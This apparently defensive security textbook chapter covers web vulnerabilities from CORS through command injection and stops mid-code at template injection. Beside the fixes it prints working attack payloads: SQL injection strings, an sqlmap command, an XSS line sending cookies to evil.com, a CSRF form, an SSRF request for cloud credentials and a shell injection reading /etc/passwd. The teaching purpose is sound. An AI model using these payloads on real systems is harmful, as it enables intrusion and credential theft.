# Chapter 5 — Web Application Security (OWASP Top 10)

## Overview

Web application security is the set of techniques that protect websites, APIs, and browser-based applications from abuse. The browser simultaneously executes code from many mutually untrusted sources, while the server receives data from every corner of the Internet; a single small gap is enough for an attacker to steal data, impersonate users, or take over the server. Because nearly every modern system exposes a web surface, this is the core axis of application information security. This chapter moves from the web's foundational security model down to each specific class of vulnerability, along with the underlying mechanisms and defensive measures.

**The Web security model (Origin, SOP, CORS).** An **origin** is the triple `(scheme, host, port)` — the smallest unit of trust a server can control. The **Same-Origin Policy (SOP)** restricts code from origin A from reading data belonging to origin B; the key point: SOP blocks *reading* the result, not *sending* the request — the very gap that CSRF exploits. **CORS (Cross-Origin Resource Sharing)** is the mechanism by which a server actively opts in to let another origin read its response, via the `Access-Control-*` headers, relaxing SOP in a controlled way.

**OWASP Top 10.** A list of the 10 most common and serious web application security risk categories, ranked from real-world data (detection frequency, exploitability, impact). It is a prioritization roadmap that covers most common risk, not an exhaustive catalog of every threat.

**The injection family (Injection: SQLi, XSS, Command, SSTI).** They share a common root: **confusing the data channel with the control (code) channel** (details in 5.3, 5.4, 5.8, 5.9).

- **SQL Injection (SQLi)** — user data is concatenated into a SQL statement, allowing the query structure to be altered and unintended data to be retrieved.
- **Cross-Site Scripting (XSS)** — JavaScript code is injected and executed in the victim's browser, under the victim page's origin, leading to session theft or actions performed on the user's behalf.
- **Command Injection** — malicious input turns into an operating-system command that runs on the server.
- **Server-Side Template Injection (SSTI)** — input is compiled by a template engine as template code, often leading to RCE.

Common defense: separate data from commands — parameterize queries, apply context-appropriate output encoding, and avoid calling the shell.

**Cross-Site Request Forgery (CSRF).** Exploits the browser's automatic attachment of session cookies to every request bound for an origin. The attacker lures a logged-in victim into triggering an impactful request without knowing the password — it is enough to be able to *send* a valid request.

**Server-Side Request Forgery (SSRF).** Forces the server to send a request to a destination of the attacker's choosing. Because the server usually sits within a trusted network zone, it is used as a proxy to reach internal services or cloud metadata — the classic example being harvesting credentials from an instance's metadata endpoint.

**Broken Access Control & IDOR.** **Broken Access Control** is the application failing to properly enforce "who is allowed to do what." **IDOR (Insecure Direct Object Reference)** is a variant: referencing an object directly by ID without checking ownership (changing `/invoices/1001` to `1002` to view someone else's data). This is the top-ranked risk category in the OWASP Top 10 2021 (A01).

**Insecure Deserialization & XXE.**

- **Insecure Deserialization** — restoring an object from an untrusted byte stream using a mechanism that allows arbitrary type reconstruction / method invocation, enabling a gadget chain that leads to RCE.
- **XML External Entity (XXE)** — an XML parser allows defining entities that point to external resources; the attacker reads internal files (`/etc/passwd`) or triggers SSRF.

**Secure file upload.** Allowing uploads while blocking web shells and evasion techniques. The validation layers: allowlist file types, verify magic bytes (do not trust the client's extension or Content-Type), randomly rename files, and store them outside the web root in a directory that is not allowed to execute.

**Input Validation vs Output Encoding.** Two different, complementary measures. **Input Validation** checks incoming data against business expectations (allowlist of format/type/range). **Output Encoding** neutralizes special characters as data is handed to an interpreter (HTML/JS/SQL/URL). Data that is valid for the business can still break a different interpreter, so both are needed.

**Authentication (Session, JWT, OAuth2/OIDC, SAML, MFA).** The process of proving identity.

- **Session cookie** — a stateful model: the server stores the session, the client keeps the session ID in a cookie.
- **JWT (JSON Web Token)** — a self-contained token, signed against tampering, enabling stateless authentication; misuse (accepting `alg:none`, not pinning the algorithm) creates serious risk.
- **OAuth2 / OIDC** — OAuth2 delegates to an application the ability to access resources on the user's behalf without exposing the password; OIDC is an identity layer built on top of OAuth2 (returns an `id_token`).
- **SAML** — XML-based enterprise SSO (assertions signed with XML-DSig).
- **MFA / TOTP** — multi-layered authentication; TOTP generates a 6-digit code that changes every 30 seconds, reducing risk when a password is leaked.

**Authorization: RBAC vs ABAC.** After authentication comes authorization — deciding "what is allowed." **RBAC** assigns permissions by role (simple, easy to audit). **ABAC** decides by attributes and context (more flexible, more complex).

**Security Headers.** Response headers that instruct the browser to behave more safely: enforce HTTPS (HSTS), prevent clickjacking (`frame-ancestors`/`X-Frame-Options`), forbid MIME sniffing (`X-Content-Type-Options: nosniff`). Low configuration cost, blocking entire classes of common attacks.

**Threat Modeling (STRIDE).** Analyzing threats from the design phase. **STRIDE** enumerates 6 threat categories: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. The process: draw a data flow diagram (DFD), mark the **trust boundaries** (where the trust level changes), then apply STRIDE to each flow that crosses a boundary. Defending from the design stage is cheaper than patching later.

**Zero Trust.** A model that abandons the assumption of trust based on network location — the slogan *never trust, always verify*. Every access to every resource is re-authenticated and re-authorized according to context, replacing the "everything inside the perimeter is safe" model.

**Logging & Monitoring.** Logging and monitoring are the foundation for detecting and investigating attacks: recording who did what, when, and with what result, and raising alerts when there are signs of anomaly. Missing logs let attacks go undetected and make post-incident investigation impossible.

> An in-depth reference document for security engineers (Blue Team / AppSec / DevSecOps). Each section moves from *what it is → internal mechanism (down to the bit/byte/step/parameter level) → real-world example → security notes*. The technical figures follow the relevant RFC/spec; wherever a specific version must be verified, it is explicitly noted.

---

## 5.1. The Web Security Model

### 5.1.1. Context: the browser is a multi-origin sandbox

A modern browser simultaneously runs code (HTML/CSS/JavaScript) from many mutually untrusted sources within the same user process. The entire web security model is built around one foundational question: *"Is code from origin A allowed to read/write data belonging to origin B?"*. Without a boundary, a malicious ad embedded in a news page could read your bank's session cookie.

The central concept is the **origin** (RFC 6454). An origin is defined by a triple (tuple):

```
origin = (scheme, host, port)
```

| Field | Example | Note |
|--------|-------|---------|
| scheme | `https` | `http` and `https` are TWO different origins |
| host   | `app.example.com` | Exact string match; `example.com` ≠ `www.example.com` |
| port   | `443` | The default port is implied by the scheme (http=80, https=443) |

Two URLs are same-origin **only when all three components match exactly**:

```
https://app.example.com:443/page1   ┐
https://app.example.com/page2       ┘ → SAME origin (443 is the default for https)

https://app.example.com   vs  http://app.example.com     → DIFFERENT (scheme)
https://app.example.com   vs  https://api.example.com    → DIFFERENT (host)
https://app.example.com   vs  https://app.example.com:8443 → DIFFERENT (port)
```

**Why design it as a tuple?** Because the smallest unit of trust a server can control on its own is precisely the origin. A server at `https://app.example.com:443` has full authority over the content it returns for that origin; it cannot vouch for content served on a different port or a different host.

### 5.1.2. Same-Origin Policy (SOP)

**What it is:** SOP is the default policy: a script running in the context of origin A is restricted in its ability to interact with resources belonging to origin B. SOP is not a single mechanism but a family of constraints applied differently to each type of resource.

**Mechanism — SOP applies differently by access type:**

| Access type | How SOP applies | Example |
|---------------|---------------------|-------|
| `XMLHttpRequest` / `fetch()` reading the response | READING is blocked if cross-origin (unless CORS allows it) | `fetch('https://api.other.com')` can be sent but the response cannot be read |
| The DOM of a cross-origin iframe | Cannot read/write `iframe.contentWindow.document` | Prevents reading another page's content |
| Cookie / `localStorage` | `localStorage` is partitioned by origin; cookies follow the domain (a subtle difference) | Each origin has its own `localStorage` store |
| Embedding static resources | NOT blocked from being SENT, only blocked from being READ | `<img src=...>`, `<script src=...>`, `<link>` from another origin still load |

The subtle point, and the root of many vulnerabilities: **SOP blocks READING the result, not SENDING the request**. The browser still sends the cross-origin request (with cookies attached if configured to allow it), the server still processes it — it is only the attacking page's JavaScript that cannot read the response. This is exactly the gap that **CSRF** exploits (being able to send is enough to cause impact), and the reason **CORS** has to exist (to relax the READING part in a controlled way).

```
The page at  https://evil.com  executes:
  fetch('https://bank.com/transfer?to=evil&amt=1000', {credentials:'include'})

  ┌─────────────┐   request (WITH bank.com cookie)  ┌──────────┐
  │  evil.com   │ ────────────────────────────────► │ bank.com │
  │  (JS)       │                                    │  server  │
  │             │ ◄──X── response READ-blocked by SOP│          │
  └─────────────┘                                    └──────────┘
       ↑ JS cannot read the body, BUT the server ALREADY processed the transfer → CSRF
```

### 5.1.3. CORS — Cross-Origin Resource Sharing (WHATWG Fetch Standard)

**What it is:** CORS is a mechanism that lets a server **actively opt in** to let another origin read its response. The server declares this via the `Access-Control-*` headers; the browser is the party that enforces the decision.

**Request classification — this is the core point:**

CORS divides requests into two groups:

1. **Simple request**: does not trigger a preflight. Conditions (ALL must hold):
   - Method ∈ {`GET`, `HEAD`, `POST`}
   - Only "CORS-safe" headers (CORS-safelisted): `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
   - `Content-Type` ∈ {`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`}
   - No event listener on `XMLHttpRequest.upload`, no use of `ReadableStream`

2. **Preflighted request**: any request that does not meet the above conditions (e.g. `PUT`, `DELETE`, or `Content-Type: application/json`, or a custom header such as `X-Api-Key`...) triggers an **OPTIONS** request beforehand to "ask permission."

**Why is a preflight needed?** To protect legacy servers that are unaware of CORS. A cross-origin `DELETE` request could cause destructive impact. The preflight ensures the server *knows about CORS and agrees* before the real request is sent. "Simple requests" do not need a preflight because they could already be created with plain HTML (forms, images) before CORS existed — they do not widen the attack surface.

**Preflight mechanism — step by step, raw:**

Step 1: The browser sends the `OPTIONS` preflight:

```http
OPTIONS /api/orders/42 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, content-type
```

| Header (request) | Meaning |
|------------------|---------|
| `Origin` | The calling page's origin (set by the browser; JS cannot alter it) |
| `Access-Control-Request-Method` | The method of the REAL request about to be sent |
| `Access-Control-Request-Headers` | List of headers (lowercase, comma-separated) the real request will use |

Step 2: The server responds to the preflight:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
Vary: Origin
```

| Header (response) | Format | Meaning | Security note |
|-------------------|-----------|---------|----------------|
| `Access-Control-Allow-Origin` | a single origin string OR `*` | The origin allowed to read the response | **`*` CANNOT be used with `credentials:include`** |
| `Access-Control-Allow-Methods` | list of methods | Allowed methods | |
| `Access-Control-Allow-Headers` | list of headers | Allowed headers to send | |
| `Access-Control-Allow-Credentials` | `true` (or absent) | Allows sending cookies/HTTP-auth | If `true`, `Allow-Origin` must be a specific origin, not `*` |
| `Access-Control-Max-Age` | seconds | How long the browser caches the preflight result | Reduces the number of preflights |
| `Vary: Origin` | | Tells intermediary caches the response depends on `Origin` | **Required if echoing Origin dynamically**, to avoid cache poisoning |

Step 3: If the preflight passes, the browser sends the real request:

```http
DELETE /api/orders/42 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Authorization: Bearer eyJhbGci...
Content-Type: application/json
```

The real response must also repeat `Access-Control-Allow-Origin` (and `Allow-Credentials` if applicable); otherwise the browser still blocks reading.

**Security notes — common CORS misconfigurations:**

```javascript
// ❌ SERIOUSLY WRONG: echo the raw Origin + allow credentials
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // echo any origin
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
// → Any page can read the response ALONG WITH the victim's cookie.
```

```javascript
// ✅ CORRECT: explicit allowlist
const ALLOW = new Set(['https://app.example.com', 'https://admin.example.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOW.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Vary', 'Origin');
  }
  next();
});
```

A common trap: a flawed regex like `origin.endsWith('example.com')` will also match `evil-example.com` and `example.com.evil.com`. You must match each origin in the allowlist exactly.

---

## 5.2. OWASP Top 10 (2021) — Overview

The OWASP Top 10 2021 is a list of the 10 most common and serious web application security risk categories, ranked based on real-world data (detection frequency, exploitability, impact). This is the current version at the time of writing (verify if OWASP releases a newer version).

The diagram below follows the path of a request through typical layers and marks where each vulnerability class arises:

```
   Client/Browser        WAF / Reverse Proxy        Application                Data layer
  ┌──────────────┐      ┌──────────────────┐     ┌────────────────────┐     ┌──────────────┐
  │ JS, DOM,     │─req─►│ attack signature  │─►   │ routing, auth,     │─►   │ DB / OS /    │
  │ cookie       │      │ filtering, rate   │     │ business logic     │     │ template /   │
  │              │◄resp─│ limit, add sec    │◄─   │ render output      │◄─   │ XML / cloud  │
  │              │      │ headers           │     │                    │     │              │
  └──────────────┘      └──────────────────┘     └────────────────────┘     └──────────────┘
        ▲                       ▲                          ▲                        ▲
   XSS (A03),            Misconfig (A05):           Broken Access            SQLi/Command/
   CSRF (A01)            missing headers,           Control & IDOR (A01),    SSTI (A03),
   runs in the          WAF bypass                  Auth Failures (A07),     XXE (A05),
   victim origin                                    SSRF (A10), Deserial.    Crypto Fail (A02)
                                                    (A08)
```

The WAF is only an outer filtering layer (defense in depth), not a replacement for patching at the application and data layers — most serious vulnerabilities live deep inside, where the WAF cannot see the context.

| Code | Name | Focus |
|----|-----|-----------|
| A01 | Broken Access Control | Privilege escalation, IDOR, missing authorization checks |
| A02 | Cryptographic Failures | Storing/transmitting sensitive data unencrypted, weak algorithms |
| A03 | Injection | SQLi, Command Injection, XSS (XSS was folded into A03 in 2021) |
| A04 | Insecure Design | Flaws at the design layer, missing threat modeling |
| A05 | Security Misconfiguration | Default configuration, missing headers, superfluous services (XXE folded in here) |
| A06 | Vulnerable and Outdated Components | Libraries/dependencies with CVEs |
| A07 | Identification and Authentication Failures | Weak authentication, poor sessions |
| A08 | Software and Data Integrity Failures | Insecure deserialization, compromised CI/CD, unsigned updates |
| A09 | Security Logging and Monitoring Failures | Missing logs, failure to detect attacks |
| A10 | Server-Side Request Forgery (SSRF) | Server forced to send requests on the attacker's behalf |

A note on mapping: **XSS** moved into A03 (Injection), **XXE** into A05 (Misconfiguration), and **SSRF** was split out into A10 following community nomination. The sections below are organized by *technical vulnerability* (easier to look up) and annotate the corresponding A0x code.

---

## 5.3. A03 — Injection: SQL Injection (SQLi)

**What it is:** SQLi occurs when user-supplied data is concatenated directly into a SQL statement, allowing the attacker to alter the query's structure rather than merely supplying data. The root cause: **mixing the data channel and the control (code) channel**.

### 5.3.1. Core mechanism

Vulnerable code:

```python
# ❌ String concatenation
query = "SELECT id, email FROM users WHERE name = '" + name + "' AND active = 1"
cursor.execute(query)
```

If `name = ' OR '1'='1` then the statement becomes:

```sql
SELECT id, email FROM users WHERE name = '' OR '1'='1' AND active = 1
```

The SQL parser cannot tell which part the programmer intended as "data" — the entire string is recompiled into a new syntax tree (AST). `'1'='1'` is always true → it returns the entire table.

### 5.3.2. Exploitation techniques (by type, with concrete payloads)

**(a) UNION-based** — used when the response displays the query data.

`UNION SELECT` appends an additional result set. Requirement: the same number of columns and compatible types. Step 1, probe the column count using `ORDER BY` increasing until it errors:

```
name=foo' ORDER BY 1-- -     → OK
name=foo' ORDER BY 2-- -     → OK
name=foo' ORDER BY 3-- -     → ERROR  ⇒ there are 2 columns
```

`-- -` is a SQL comment (two dashes + a space) to neutralize the rest; appending a trailing `-` avoids being trimmed. Step 2, extract the data:

```
name=foo' UNION SELECT username, password FROM users-- -
```

**(b) Error-based** — forces the DBMS to leak data through an error message (e.g. MySQL):

```
name=foo' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
```

`0x7e` is the `~` character; `extractvalue` raises an XPath error containing the query string → the data is leaked in the message.

**(c) Boolean-based blind** — no direct output; inferred via TRUE/FALSE (the page responds differently):

```
id=5 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

If the page shows "product exists" ⇒ the first character is `a`. Iterate over each position, each character (usually a binary search on the ASCII code) to extract each byte.

**(d) Time-based blind** — when there is not even a visible difference; inferred via delay:

```
id=5; IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -
-- MySQL: SLEEP(5) ; PostgreSQL: pg_sleep(5) ; MSSQL: WAITFOR DELAY '0:0:5'
```

If the response is delayed by ~5 seconds ⇒ the condition is true. Slow, but it works even when no observable response is available.

**Raw request/response illustration (boolean blind):**

```http
GET /product?id=5%20AND%201=1 HTTP/1.1
Host: shop.example.com
```
```http
HTTP/1.1 200 OK
... <div class="product">T-shirt</div> ...   ← TRUE: product is shown
```
```http
GET /product?id=5%20AND%201=2 HTTP/1.1
```
```http
HTTP/1.1 200 OK
... <div class="empty">Not found</div> ... ← FALSE: a different page
```

### 5.3.3. Real-world tool: sqlmap

```bash
# Automatically detect and exploit SQLi on one parameter
sqlmap -u "https://shop.example.com/product?id=5" \
       --batch \                    # no interactive prompts, use defaults
       --level=3 --risk=2 \         # test depth (1-5 / 1-3)
       --dbms=mysql \               # pin the DBMS type to reduce noise
       --technique=BEUST \          # B=boolean E=error U=union S=stacked T=time
       --dbs                        # list the databases
```

Sample output:

```
[INFO] testing connection to the target URL
[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable
[INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 2 columns' injectable
available databases [2]:
[*] information_schema
[*] shop
```

Parameter explanation: `--level` increases the number of injection points (header, cookie...); `--risk` permits heavier payloads (possibly OR-based ones that may modify data). For Blue Teams, sqlmap's request signatures (User-Agent `sqlmap/`, strings like `AND 1=1`, `ORDER BY n`, `SLEEP(`) are tell-tale indicators detectable via WAF/logs.

### 5.3.4. Defense: Prepared Statements (Parameterized Queries)

**The core mechanism of the fix:** a prepared statement separates COMPILING the statement from PASSING the data. The DB server compiles the statement skeleton with `?` placeholders first; the data is sent afterward over a separate channel (binary protocol) and **is never re-parsed as SQL**. The query structure is fixed — the attacker cannot change the syntax tree.

```python
# ✅ Python (DB-API), placeholder handled by the driver
cursor.execute(
    "SELECT id, email FROM users WHERE name = %s AND active = 1",
    (name,)              # the parameter travels on a separate channel
)
```

```java
// ✅ Java JDBC
PreparedStatement ps = conn.prepareStatement(
    "SELECT id, email FROM users WHERE name = ? AND active = 1");
ps.setString(1, name);   // bind the parameter, do not concatenate strings
ResultSet rs = ps.executeQuery();
```

Note: a prepared statement CANNOT parameterize table/column names or keywords (`ORDER BY <col>`). For those parts use an **allowlist** that maps the user value to a valid column name; never concatenate strings. ORMs (Hibernate, SQLAlchemy, Prisma) used correctly will automatically generate prepared statements, but a `raw query` in an ORM can still be SQLi if it concatenates strings.

---

## 5.4. A03 — Cross-Site Scripting (XSS)

**What it is:** XSS is the injection of JavaScript code that executes in the victim's browser context, under the victim page's origin. Because it runs in that origin, the code can read cookies (those without `HttpOnly`), `localStorage`, perform actions on the user's behalf, keylog, etc. The root cause: **untrusted data is embedded into the page without context-appropriate encoding**.

### 5.4.1. Three types of XSS

| Type | Payload source | Where stored | Characteristics |
|------|----------------|-----------|----------|
| **Reflected** | Request parameter (URL, form) | Not stored — reflected immediately in the response | Requires luring the victim to click a malicious link |
| **Stored** | Data stored in the DB (comment, profile) | The server stores it and serves it back to everyone | Most dangerous, self-propagating |
| **DOM-based** | A client-side source (`location.hash`...) | Does not go through the server | Client JS writes data into the DOM unsafely |

### 5.4.2. Concrete payloads and request/response

**Reflected** — an endpoint that reflects `q`:

```http
GET /search?q=<script>document.location='https://evil.com/c?'+document.cookie</script> HTTP/1.1
```
Response (vulnerable):
```http
HTTP/1.1 200 OK
Content-Type: text/html
...
<p>Results for: <script>document.location='https://evil.com/c?'+document.cookie</script></p>
```
The browser parses `<script>` and executes it → the cookie is sent to `evil.com`.

**DOM-based** — no server processing needed:

```html
<!-- A page containing vulnerable code -->
<script>
  document.getElementById('out').innerHTML = location.hash.substring(1);
</script>
```
Attack URL:
```
https://app.example.com/page#<img src=x onerror=alert(document.cookie)>
```
`location.hash` (`#...`) **is not sent to the server**, so a server-side WAF does not see it. `innerHTML` parses the `<img>`, and the `onerror` event fires when the image fails to load. (Note: a `<script>` tag inserted via `innerHTML` does not auto-run, so DOM-XSS payloads use `onerror`/`onload`.)

### 5.4.3. Defense layer 1: CONTEXT-aware Output Encoding

The key point: **encoding must match the context where the data is inserted**. The same string needs different encoding:

| Insertion context | What to encode | Example |
|---------------|---------------|-------|
| HTML body / text node | `& < > " '` → entity | `<` → `&lt;` |
| HTML attribute (quoted) | `" & ` + surround with `"` | `"` → `&quot;` |
| JavaScript string | `\xHH` or `\uHHHH`, escape `< / '` | `</script>` → `\x3C\/script\x3E` |
| URL (query value) | percent-encoding | space → `%20` |
| CSS value | escape `\HH ` | |

```
Common mistake: HTML-encode then insert into a JS context:
  <script>var x = "&lt;b&gt;";</script>   ← still broken if the data contains " or </script>
```

```javascript
// ✅ Use a template engine that auto-escapes for the CORRECT context
// React automatically escapes when rendering {value} into JSX → safe for HTML context
function Comment({ text }) { return <p>{text}</p>; }  // text is HTML-escaped

// ❌ But dangerouslySetInnerHTML breaks the protection
function Bad({ html }) { return <div dangerouslySetInnerHTML={{__html: html}} />; }
```

For user-supplied HTML (rich text), encoding alone is not enough — you must **sanitize** with an allowlist of tags/attributes:

```javascript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b','i','em','strong','a','p','ul','li'],
  ALLOWED_ATTR: ['href']
});  // strips out <script>, onerror=, javascript: ...
```

### 5.4.4. Defense layer 2: Content Security Policy (CSP)

**What it is:** CSP is an HTTP header that declares the valid resource sources; the browser refuses to execute/load resources outside the policy. CSP is a **defense-in-depth layer** — it mitigates impact when encoding is missed.

```http
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-r4nd0mB4se64';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

| Directive | Meaning | Note |
|-----------|---------|-------|
| `default-src` | The default for all resource types | `'self'` = same origin |
| `script-src` | Valid script sources | Avoid `'unsafe-inline'`, `'unsafe-eval'` |
| `'nonce-xxx'` | Only scripts carrying the correct `nonce` may run | The nonce must be random PER response |
| `object-src 'none'` | Blocks `<object>/<embed>` (Flash...) | |
| `base-uri 'self'` | Blocks `<base>` injection that changes relative URLs | |
| `frame-ancestors` | Who is allowed to embed this page in an iframe | Replaces `X-Frame-Options` |

The nonce mechanism: the server generates a random string (≥128-bit base64) at each render, attaching it to both the CSP header and the `nonce=` attribute of the legitimate `<script>` tag. A script injected by an attacker does not know the nonce → it is blocked:

```html
<script nonce="r4nd0mB4se64">/* legitimate code runs */</script>
<script>/* XSS injected, NO nonce → blocked */</script>
```

**Violation reporting** for Blue Team monitoring:

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```
`Report-Only` does not block; it only sends JSON reports to `/csp-report` — used for gradual rollout, to find false positives before enforcing.

**Security notes:** Session cookies should be set `HttpOnly` so that JS (including XSS) cannot read `document.cookie`. However, XSS can still perform actions within the session (sending requests on the user's behalf), so `HttpOnly` reduces rather than eliminates the risk.

---

## 5.5. CSRF — Cross-Site Request Forgery (related to A01)

**What it is:** CSRF exploits the browser's **automatic attachment of cookies** to requests bound for an origin, regardless of where the request was initiated. The attacker lures a logged-in victim into triggering an impactful request against the victim site. Unlike XSS: CSRF does not need to read the response, it only needs to *send* a valid request.

### 5.5.1. Mechanism

```html
<!-- The evil.com page, victim is logged into bank.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit();</script>
```
When the victim opens the page, the form submits itself. The browser attaches the `bank.com` session cookie → the server processes it as a legitimate request.

### 5.5.2. Defense 1: Anti-CSRF Token (Synchronizer Token Pattern)

The server generates a random token (≥128 bits), embeds it in a hidden form field, and stores it server-side (bound to the session). The impactful request must include the token; the server compares them. Because of SOP, `evil.com` **cannot read** the token (it lives in `bank.com`'s HTML) → it cannot forge it.

```http
POST /transfer HTTP/1.1
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

to=bob&amount=50&csrf_token=9f8a7b6c5d4e3f2a1b0c...
```
The server checks that `csrf_token` matches the value bound to `session`. The token should be: single-use or per-session, and compared using constant-time comparison (to thwart timing attacks).

### 5.5.3. Defense 2: SameSite Cookie

**Mechanism.** The `SameSite` attribute instructs the browser on whether to send the cookie with cross-site requests.

| Value | Behavior | Note |
|---------|---------|---------|
| `Strict` | Does NOT send the cookie with any request originating from another site | Strongest; breaks navigation from external links |
| `Lax` | Sent with top-level GET navigation (clicking a link), NOT sent with cross-site POST / subresources | The default in modern browsers |
| `None` | Always sent (must be accompanied by `Secure`) | Needed for genuinely cross-site cookies |

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

`SameSite=Lax` by default already blocks self-submitting POST-based CSRF. However, you should not rely on SameSite alone (some GET requests cause impact, or there may be older clients); combine it with an anti-CSRF token for sensitive actions.

---

## 5.6. A10 — Server-Side Request Forgery (SSRF)

**What it is:** SSRF is forcing the **server** to send an HTTP/TCP request to a destination of the attacker's choosing. Because the server usually sits in a trusted internal network, the attacker uses it as a proxy to reach internal services, cloud metadata, or to scan internal ports.

### 5.6.1. The classic target: Cloud metadata

On AWS EC2 (IMDSv1), the metadata endpoint returns temporary credentials:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
`169.254.169.254` is a link-local address (RFC 3927, range `169.254.0.0/16`) reachable only from within the instance. Vulnerable code:

```python
# ❌ Fetch a user-supplied URL
url = request.args['image_url']
resp = requests.get(url)        # attacker passes url=http://169.254.169.254/...
```

Payload:
```http
POST /fetch-image HTTP/1.1
Content-Type: application/json

{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}
```
The response contains `AccessKeyId`, `SecretAccessKey`, `Token` → the attacker takes over the role.

**Why IMDSv2 was created:** IMDSv2 requires obtaining a token via `PUT` (with the `X-aws-ec2-metadata-token-ttl-seconds` header) first, and only then a `GET` with the token. Because basic SSRF usually only sends GET requests, IMDSv2 blocks many variants. Recommendation: enforce IMDSv2 (`HttpTokens: required`).

### 5.6.2. Defense: Allowlist + block internal IPs

```python
import ipaddress, socket
from urllib.parse import urlparse

BLOCK_NETS = [ipaddress.ip_network(n) for n in
    ['127.0.0.0/8','10.0.0.0/8','172.16.0.0/12','192.168.0.0/16',
     '169.254.0.0/16','::1/128','fc00::/7']]

def safe_fetch(url):
    u = urlparse(url)
    if u.scheme not in ('http','https'):
        raise ValueError('scheme not allowed')
    # Resolve to prevent DNS rebinding: check the real IP
    ip = ipaddress.ip_address(socket.gethostbyname(u.hostname))
    if any(ip in net for net in BLOCK_NETS):
        raise ValueError('internal IP blocked')
    return requests.get(url, allow_redirects=False, timeout=5)  # block redirects to internal IPs
```

| Evasion technique | How to block it |
|-------------|-----------|
| `http://0177.0.0.1` (octal), `http://2130706433` (decimal) → 127.0.0.1 | Resolve to an IP first, then match against ranges, not the string |
| DNS rebinding (short TTL, domain → internal IP) | Resolve once, pin that IP for the whole connection |
| 302 redirect → internal IP | `allow_redirects=False` then check it yourself |
| `gopher://`, `file://` | Scheme allowlist |

**Security notes:** The strongest defense is a **specific destination allowlist** (allow only a few known hosts) rather than a blocklist; combine it with an egress firewall that blocks the server from reaching out to `169.254.169.254` and the internal network.

---

## 5.7. A01 — Broken Access Control & IDOR

**What it is:** Broken Access Control: the application fails to properly enforce that a user may only do what they are allowed. **IDOR (Insecure Direct Object Reference)** is a variant: referencing an object directly (by ID) without checking ownership.

### 5.7.1. The IDOR mechanism

```http
GET /api/invoices/1001 HTTP/1.1
Authorization: Bearer <user A's token>
```
The server returns invoice 1001. The attacker switches to `1002`:
```http
GET /api/invoices/1002 HTTP/1.1
Authorization: Bearer <user A's token>
```
If the server returns 1002 (belonging to user B) without checking `invoice.owner == current_user` → IDOR.

```python
# ❌ Only checks login, does not check ownership
@app.get('/api/invoices/<int:iid>')
@login_required
def get_invoice(iid):
    return Invoice.query.get(iid)            # anyone can fetch any id
```
```python
# ✅ Check ownership in the query ITSELF
@app.get('/api/invoices/<int:iid>')
@login_required
def get_invoice(iid):
    inv = Invoice.query.filter_by(id=iid, owner_id=current_user.id).first_or_404()
    return inv
```

### 5.7.2. Broken Access Control variants

| Variant | Description | Defense |
|----------|-------|-----------|
| Vertical privilege escalation | A regular user calls an admin endpoint (`/admin/users`) | Check the role on the server, do not rely on hiding the button in the UI |
| Horizontal (IDOR) | Accessing another same-level user's resource | Check ownership on each resource |
| Force browsing | Guessing an unlinked URL (`/internal/report`) | Deny by default, check authorization on every route |
| Mass assignment | A POST adds a `role=admin` field that gets bound | Allowlist the fields that may be modified |
| Method override | Using `PUT/DELETE` when only `GET` was tested | Check authorization per method as well |

**Design principle:** *deny by default*, centralize authorization checks (middleware) on the **server** for every request. Do not use guessable sequential IDs as a security mechanism (UUIDs help reduce enumeration but do NOT replace authorization checks).

---

## 5.8. A03 — Command Injection

**What it is:** When an application passes user data into an operating-system command through a shell, the attacker injects shell metacharacters (`;`, `|`, `&&`, `` ` ``, `$()`) to execute arbitrary commands.

```python
# ❌ shell=True + string concatenation
host = request.args['host']
os.system("ping -c 1 " + host)     # host = "8.8.8.8; cat /etc/passwd"
```
The shell sees: `ping -c 1 8.8.8.8; cat /etc/passwd` → runs both commands.

| Metachar | Effect | Payload |
|----------|----------|---------|
| `;` | Sequential command separator | `8.8.8.8; id` |
| `\|` | Pipe / run the next command | `8.8.8.8 \| id` |
| `&&` / `\|\|` | AND / OR | `8.8.8.8 && id` |
| `` `cmd` `` / `$(cmd)` | Command substitution | `$(id)` |
| `\n` | Newline = a new command | |

**Defense:** do not invoke a shell; pass arguments as an array (execve receives argv directly, with no shell parsing):

```python
# ✅ No shell, separated argv
import subprocess, ipaddress
ipaddress.ip_address(host)         # validate it is a valid IP first
subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5)
```
`shell=False` + an argv list → `host` is always a SINGLE argument, and metacharacters lose their effect. Combine this with input validation (allowlist of characters/format).

---

## 5.9. A03 — Server-Side Template Injection (SSTI)

**What it is:** When user input is embedded into a server-side template engine and the engine *compiles* it as template code, the attacker can execute engine expressions → often leading to RCE.

```python
# ❌ Jinja2: concatenate input into the template string
from jinja2 import Template
